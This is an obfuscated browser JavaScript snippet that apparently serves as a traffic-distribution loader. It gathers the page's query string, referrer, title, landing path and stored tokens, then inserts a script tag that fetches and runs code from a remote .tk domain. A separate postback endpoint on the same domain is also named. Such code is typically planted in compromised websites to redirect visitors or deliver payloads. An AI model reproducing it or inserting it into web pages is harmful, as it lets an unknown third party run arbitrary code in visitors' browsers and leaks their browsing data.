  (function() {
    var name = '_Q7rDm9rp1XFW6f4L';
    if (!window._Q7rDm9rp1XFW6f4L) {
        window._Q7rDm9rp1XFW6f4L = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://perneyledisrio.tk/fashionnetworks',
            P_PATH: 'https://perneyledisrio.tk/fec84ce/postback',
        };
    }
    const _dD1hWKhF5tMSGst8 = localStorage.getItem('config');
    if (typeof _dD1hWKhF5tMSGst8 !== 'undefined' && _dD1hWKhF5tMSGst8 !== null) {
        var _PL977V6GvMCQXJtY = JSON.parse(_dD1hWKhF5tMSGst8);
        var _HZmxPcS1g1C9MWYF = Math.round(+new Date()/1000);
        if (_PL977V6GvMCQXJtY.created_at + window._Q7rDm9rp1XFW6f4L.ttl < _HZmxPcS1g1C9MWYF) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _GD6mhmtz3HMfkrmr = localStorage.getItem('subId');
    var _BcWFLcw6JNC4fpTq = localStorage.getItem('token');
    var _zGt6K56sY5L5jF1n = '?return=js.client';
        _zGt6K56sY5L5jF1n += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _zGt6K56sY5L5jF1n += '&se_referrer=' + encodeURIComponent(document.referrer);
        _zGt6K56sY5L5jF1n += '&default_keyword=' + encodeURIComponent(document.title);
        _zGt6K56sY5L5jF1n += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _zGt6K56sY5L5jF1n += '&name=' + encodeURIComponent(name);
        _zGt6K56sY5L5jF1n += '&host=' + encodeURIComponent(window._Q7rDm9rp1XFW6f4L.R_PATH);
    if (typeof _GD6mhmtz3HMfkrmr !== 'undefined' && _GD6mhmtz3HMfkrmr && window._Q7rDm9rp1XFW6f4L.unique) {
        _zGt6K56sY5L5jF1n += '&sub_id=' + encodeURIComponent(_GD6mhmtz3HMfkrmr);
    }
    if (typeof _BcWFLcw6JNC4fpTq !== 'undefined' && _BcWFLcw6JNC4fpTq && window._Q7rDm9rp1XFW6f4L.unique) {
        _zGt6K56sY5L5jF1n += '&token=' + encodeURIComponent(_BcWFLcw6JNC4fpTq);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._Q7rDm9rp1XFW6f4L.R_PATH + _zGt6K56sY5L5jF1n;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
